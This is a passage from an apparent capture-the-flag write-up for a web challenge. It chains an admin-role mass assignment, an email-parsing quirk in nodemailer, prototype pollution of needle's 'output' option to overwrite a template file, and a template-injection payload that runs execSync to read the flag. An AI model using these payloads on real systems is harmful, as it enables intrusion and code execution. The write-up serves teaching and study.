</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">email</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">role</span> <span class="o">=</span> <span class="s2">&#34;guest&#34;</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span></code></pre></div><p>Now we try this :
Register with role admin :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SyfoLrKB1x.png" alt="image" />
    
  </figure>

Login with opt code received from email page:

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1RhIStSyx.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Now we are admins !!! 
    <div id="now-we-are-admins-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#now-we-are-admins-" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>Let find out what we can do now . We have just some thing interesting !</li>
</ul>
<pre tabindex="0"><code class="language-javascriptj" data-lang="javascriptj">const transmitAPI = async (req, res) =&gt; {
  const { url } = req.body;

  if (!url) {
    return res.status(400).json({ message: &#34;URL is required&#34; });
  }

  const responseBody = await fetchURL(url);

  res.status(200).json({
    message: &#34;Request successful&#34;,
    responseBody,
  });
};

const editBountiesAPI = async (req, res) =&gt; {
  const { ...bountyData } = req.body;
  try {
    const data = await BountyModel.findByPk(req.params.id, {
      attributes: [
        &#34;target_name&#34;,
        &#34;target_aliases&#34;,
        &#34;target_species&#34;,
        &#34;last_known_location&#34;,
        &#34;galaxy&#34;,
        &#34;star_system&#34;,
        &#34;planet&#34;,
        &#34;coordinates&#34;,
        &#34;reward_credits&#34;,
        &#34;reward_items&#34;,
        &#34;issuer_name&#34;,
        &#34;issuer_faction&#34;,
        &#34;risk_level&#34;,
        &#34;required_equipment&#34;,
        &#34;posted_at&#34;,
        &#34;status&#34;,
        &#34;image&#34;,
        &#34;description&#34;,
        &#34;crimes&#34;,
        &#34;id&#34;,
      ],
    });

    if (!data) {
      return res.status(404).json({ message: &#34;Bounty not found&#34; });
    }

    const updated = mergedeep(data.toJSON(), bountyData);

    await data.update(updated);

    return res.json(updated);
  } catch (err) {
    console.log(err);
    return res.status(500).json({ message: &#34;Error fetching data&#34; });
  }
};
</code></pre><p>We will have 2 main controllers :</p>
<ul>
<li>Transmit API will make a requests to our given url with <em><strong>needle</strong></em> library ? It looks really weird and maybe some hints of this ctf.</li>
<li>EditBountyApis will merge our data with an object ?? Damn, its really clear that here is an Prototype Pollution attack and we need to find some gadgets and maybe it will be exist in the <strong>needle</strong>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fetchURL</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Invalid URL: URL must start with http or https&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="kr">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nx">compressed</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nx">follow_max</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nx">needle</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">resp</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Error fetching the URL: &#34;</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="nx">resolve</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="p">});</span>
</span></span><span class="line"><span class="cl"> <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>The needle will call get with url , options ,and a callbacks. After reading the needle library, it seems interesting here.

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/B1ImuBYH1x.png" alt="image" />
    
  </figure>

We can use the attribute output to write a any file !!!! So combine this with the prototype pollution we can achive  this easily with  :</p>
<pre tabindex="0"><code class="language-index" data-lang="index">  &#34;__proto__&#34;:{
     &#34;output&#34;:&#34;/app/views/index.html&#34; 
  }
  // Write into template files to receive easily
</code></pre><p>Lets polluted the options :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HJIMFSFrJl.png" alt="image" />
    
  </figure>
</p>
<p>Now whatever we receive from the calling transmit API will be stored in /app/views/index.html which we can see it !!!Just host a simple page with the payload :</p>
<pre tabindex="0"><code class="language-index" data-lang="index">{{range.constructor(&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tail /flag.txt&#39;)&#34;)()}}
</code></pre><p>Finally, send this through our url .

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Hko6FHtBJe.png" alt="image" />
    
  </figure>

We overwrite this !!! Now lets check the index.html

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HkPk5HYrJx.png" alt="image" />
    
  </figure>

Ehh ?? It looks unupdated :vv

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1BMcSKryx.png" alt="image" />
    
  </figure>

But in docker it get changed !!
Maybe we need to triger and update in our app
In the config :</p>
<pre tabindex="0"><code class="language-superiv=" data-lang="superiv=">[program:node]
directory=/app
command=node index.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
</code></pre><p>Our app is allowed to restart, so we need to trigger this. We need to make a crash or execption.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">transmitAPI</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;URL is required&#34;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">responseBody</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetchURL</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Request successful&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">responseBody</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>We can abuse this because it doesnt catch any exception. Just send random URL
ANd get the FLAGGGGGGG

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/S1F-jHtrkx.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>Thats the end of challenge :v</li>
</ul>


<h1 class="relative group">Research about NodeMailer behaviours 
    <div id="research-about-nodemailer-behaviours" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#research-about-nodemailer-behaviours" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>Now I will explain why our email works.</li>
</ul>
<pre tabindex="0"><code> email =  &#34;test@email.htb&#34; @interstellar.htb
</code></pre><ul>
<li>I read the source code of nodemailer to figure out this. You could try too at <a href="https://github.com/nodemailer/nodemailer" target="_blank">here</a>.
<ul>
<li>I wont refer to the way of express-addresses work because it just follow the RFC 5322 and our email will be parsed with domain &ldquo;@interstellar.htb&rdquo; as expected. So I just focus on the nodemailer</li>
</ul>
</li>
</ul>


<h2 class="relative group">Main steps 
    <div id="main-steps" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#main-steps" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<ul>
<li>First the command will tokenize our address with following code:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">Tokenizer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">operatorCurrent</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">escaped</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">list</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * Operator tokens and which tokens are expected to end the sequence
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">operators</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&#34;&#39;</span><span class="o">:</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;(&#39;</span><span class="o">:</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;&#39;</span><span class="o">:</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;,&#39;</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;:&#39;</span><span class="o">:</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Semicolons are not a legal delimiter per the RFC2822 grammar other
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// than for terminating a group, but they are also not valid for any
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// other use in this context.  Given that some mail clients have
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// historically allowed the semicolon as a delimiter equivalent to the
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// comma in their UI, it makes sense to treat them the same as a comma
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// when used outside of a group.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;;&#39;</span><span class="o">:</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * Tokenizes the original input string
</span></span></span><span class="line"><span class="cl"><span class="cm">     *
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return {Array} An array of operator|text tokens
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">tokenize</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">list</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">chr</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">nextChr</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">?</span> <span class="k">this</span><span class="p">.</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">checkChar</span><span class="p">(</span><span class="nx">chr</span><span class="p">,</span> <span class="nx">nextChr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">node</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">node</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">value</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">().</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * Checks if a character is an operator or text and acts accordingly
</span></span></span><span class="line"><span class="cl"><span class="cm">     *
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param {String} chr Character from the address field
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">    <span class="nx">checkChar</span><span class="p">(</span><span class="nx">chr</span><span class="p">,</span> <span class="nx">nextChr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">escaped</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// ignore next condition blocks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">chr</span> <span class="o">===</span> <span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;operator&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">value</span><span class="o">:</span> <span class="nx">chr</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">nextChr</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">nextChr</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">noBreak</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">escaped</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span> <span class="o">&amp;&amp;</span> <span class="nx">chr</span> <span class="k">in</span> <span class="k">this</span><span class="p">.</span><span class="nx">operators</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;operator&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">value</span><span class="o">:</span> <span class="nx">chr</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">operators</span><span class="p">[</span><span class="nx">chr</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">escaped</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">([</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">operatorExpecting</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">chr</span> <span class="o">===</span> <span class="s1">&#39;\\&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">escaped</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">node</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">value</span><span class="o">:</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">chr</span> <span class="o">===</span> <span class="s1">&#39;\n&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Convert newlines to spaces. Carriage return is ignored as \r and \n usually
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// go together anyway and there already is a WS for \n. Lone \r means something is fishy.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">chr</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">chr</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x21</span> <span class="o">||</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">chr</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// skip command bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">this</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">value</span> <span class="o">+=</span> <span class="nx">chr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">escaped</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><ul>
<li>It splits our data into an token array :<br>

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rkclg8tSkx.png" alt="image" />
    
  </figure>

It will split the &quot; as a operator and our text is just text :v. Then put this token through _handleAddress function.
The logic is really simple and comment makes it readable.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">_handleAddress</span><span class="p">(</span><span class="nx">tokens</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">isGroup</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">state</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">addresses</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">address</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">comment</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">group</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">text</span><span class="o">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Filter out &lt;addresses&gt;, (comments) and regular text
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
